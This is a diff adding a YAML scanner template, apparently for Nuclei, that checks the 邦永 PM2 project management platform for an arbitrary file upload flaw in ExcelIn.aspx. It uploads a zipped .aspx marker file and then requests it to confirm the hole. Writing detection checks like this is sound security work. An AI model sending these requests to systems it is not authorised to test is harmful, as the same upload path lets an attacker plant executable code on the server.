@@ -1,0 +1,61 @@
+id: poc-yaml-pm2-excelIn-zip-upload
+info:
+  name: 邦永PM2项目管理平台系统ExcelIn.aspx存在任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  t1: "{{rand_int(100,999)}}"
+  archive: "{{zip('test'+t1+'.aspx', 'vulnerability')}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/FlowChartDefine/ExcelIn.aspx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=---------------------------335518608136410266804188096265"
+    body: |-
+      -----------------------------335518608136410266804188096265
+      Content-Disposition: form-data; name="__VIEWSTATE"
+
+      CX8CDdAjNN9+19sa3xOCEybpUx0hn5DnMqGQQzm1JI+njfE/pGi9oDDI5PRCH8wVs/UCahOCnHho2chhS8X5jCYrh1hzlOaS5VIl/VYxh3LhmXkQwsOYhNFmg9+ZmmilXRKT5WAN6WceP6U9c1Kqtw==
+      -----------------------------335518608136410266804188096265
+      Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
+
+      FD259C0F
+      -----------------------------335518608136410266804188096265
+      Content-Disposition: form-data; name="__EVENTVALIDATION"
+
+      dvfybORq87SoxN9g6GB9Qryd4qSb5ynAZtDiE0yV2TwdNpGBHpvAVQSmjJzCuqbm/b0rSjXag7dSZXfX041XcbqxqzunkN0F88hB7kUvvb8RZ0DDlXcuuntLzH6gkJYF
+      -----------------------------335518608136410266804188096265
+      Content-Disposition: form-data; name="FileUpload1"; filename="1.zip"
+      Content-Type: application/x-zip-compressed
+
+      {{archive}}
+      -----------------------------335518608136410266804188096265
+      Content-Disposition: form-data; name="Button1"
+
+      模块导入
+      -----------------------------335518608136410266804188096265--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/FlowChartDefine/test{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "vulnerability"
